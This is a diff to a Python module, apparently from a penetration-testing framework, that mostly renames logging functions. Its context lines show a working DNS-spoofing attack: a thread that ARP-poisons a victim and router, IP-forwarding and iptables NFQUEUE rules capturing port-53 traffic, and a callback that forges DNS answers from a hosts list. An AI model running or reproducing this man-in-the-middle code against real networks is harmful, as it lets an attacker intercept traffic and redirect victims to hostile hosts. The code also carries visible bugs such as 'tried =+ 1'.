@@ -15,7 +15,8 @@ try:
 except:
     importerror = True
     terror = traceback.format_exc()
-    printError("cannot import netfilterqueue! have you installed dependencies?")
+    print(terror)
+    print_error("cannot import netfilterqueue! have you installed dependencies?")
 
 
 conf = {
@@ -29,7 +30,7 @@ conf = {
     "lastmod": "31.12.2016",
     "apisupport": False,
     "needroot": 1,
-    "dependencies": ["libnetfilter-queue-dev", "python3.5-dev"]
+    "dependencies": ["libnetfilter-queue-dev"]
 }
 
 
@@ -91,21 +92,21 @@ class ArpSpoofer(threading.Thread):
         routerMAC = self.originalMAC(self.router)
         victimMAC = self.originalMAC(self.victim)
         if routerMAC == None:
-            printError("could not find router MAC address")
+            print_error("could not find router MAC address")
             if tried < 5:
-                printInfo("trying again...")
+                print_info("trying again...")
                 tried =+ 1
                 self.run()
-            printInfo("giving up...")
+            print_info("giving up...")
             self.controller.error = "[err] could not find router MAC address"
             self.controller.kill = True
         if victimMAC == None:
-            printError("could not find victim MAC address")
+            print_error("could not find victim MAC address")
             if tried < 5:
-                printInfo("trying again...")
+                print_info("trying again...")
                 tried =+ 1
                 self.run()
-            printInfo("giving up...")
+            print_info("giving up...")
             self.controller.error = "[err] could not find victim MAC address"
             self.controller.kill = True
 
@@ -113,7 +114,7 @@ class ArpSpoofer(threading.Thread):
             if self.controller.kill == True:
                 self.restore(self.router, self.victim, routerMAC, victimMAC)
                 os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
-                printInfo("arp spoofing ended")
+                print_info("arp spoofing ended")
                 return
             self.poison(self.router, self.victim, routerMAC, victimMAC)
             time.sleep(1.5)
@@ -129,7 +130,7 @@ def callback(packet):
     else:
         for record in hostlist:
             if record[1] in pkt[DNS].qd.qname or record[1] == b'*':
-                printInfo(pkt[DNS].qd.qname.decode()+" -> "+record[0].decode())
+                print_info(pkt[DNS].qd.qname.decode()+" -> "+record[0].decode())
                 found = True
                 spoofed_pkt = bytes(IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                     UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
@@ -147,20 +148,20 @@ hostlist = []
 
 def run():
     if importerror == True:
-        printError("netfilterqueue isn't imported")
-        printInfo("install the dependencies and reload this module")
+        print_error("netfilterqueue isn't imported")
+        print_info("install the dependencies and reload this module")
         print("traceback:\n"+str(error))
         return
 
     controller.reset()
-    printInfo("loading host list...")
+    print_info("loading host list...")
     try:
         hostfile = open(getpath.conf()+"hosts", "r").read()
     except FileNotFoundError:
-        printError("host list not found")
+        print_error("host list not found")
         return
     except PermissionError:
-        printError("permission denied")
+        print_error("permission denied")
     for line in hostfile.splitlines():
         if "#" not in line and len(line.split()) == 2:
             hostlist.append(line.split())
@@ -176,13 +177,13 @@ def run():
             pass
 
     if variables["arp_spoof"][0] == "true":
-        printInfo("ipv4 forwarding...")
+        print_info("ipv4 forwarding...")
         os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
-        printInfo("starting arp spoof...")
+        print_info("starting arp spoof...")
         arpspoof = ArpSpoofer(variables["router"][0], variables["target"][0], controller)
         arpspoof.start()
 
-    printInfo("ctrl + c to end")
+    print_info("ctrl + c to end")
     os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
     try:
         q = NetfilterQueue()
@@ -194,12 +195,12 @@ def run():
             q.unbind()
             os.system('iptables -F')
             os.system('iptables -X')
-            printInfo("dns spoof ended")
+            print_info("dns spoof ended")
     except:
-        printError("unexcepted error:\n")
+        print_error("unexcepted error:\n")
         traceback.print_exc(file=sys.stdout)
         controller.kill = True
 
     if variables["arp_spoof"][0] == "true":
-        printInfo("stopping arp spoof")
+        print_info("stopping arp spoof")
         arpspoof.join()
